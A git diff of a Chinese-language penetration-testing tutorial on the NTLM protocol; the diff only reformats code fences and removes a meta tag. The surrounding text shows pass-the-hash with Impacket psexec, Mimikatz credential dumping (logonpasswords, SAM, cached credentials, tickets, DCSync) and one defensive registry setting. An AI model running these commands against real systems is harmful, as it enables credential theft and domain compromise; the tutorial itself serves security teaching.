@@ -12,8 +12,6 @@ authors:
 draft: false
 slug: "ntlm-protocol-and-attack-techniques"
 ---
-<meta name="referrer" content="no-referrer">
-
 
 # NTLM协议&攻击手法
 
@@ -438,13 +436,13 @@ if __name__ == "__main__":
 3. **使用 PTH 工具发起会话**：
 - Windows 自带：
 
-```
+```cmd
 runas /netonly /user:DOMAIN\Administrator cmd
 ```
 
 - Impacket：
 
-```
+```bash
 python3 psexec.py DOMAIN/Administrator@TARGET -hashes <LMhash>:<NThash>
 ```
 
@@ -455,7 +453,7 @@ python3 psexec.py DOMAIN/Administrator@TARGET -hashes <LMhash>:<NThash>
 - 禁用 NTLM 或限制 NTLM 使用（用 Kerberos 代替）。
 - 启用 **LSASS 保护（RunAsPPL）**：
 
-```
+```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
 ```
 
@@ -488,38 +486,38 @@ Impacket 是一个内网渗透的“命令行航母”，它将复杂的Windows�
 
 **提升权限**
 
-```
+```cmd
 privilege::debug
 ```
 
 **导出系统凭据:**
 
-```
+```cmd
 sekurlsa::logonpasswords
 ```
 
 **导出SAM数据库:**
 
-```
+```cmd
 lsadump::sam
 ```
 
 **导出缓存的域凭据:**
 
-```
+```cmd
 lsadump::cache
 ```
 
 **Kerberos票据操作:**
 
-```
+```cmd
 sekurlsa::tickets
 kerberos::list
 ```
 
 **导出NTDS.dit (域控制器):**
 
-```
+```cmd
 lsadump::dcsync /user:Administrator
 ```
 
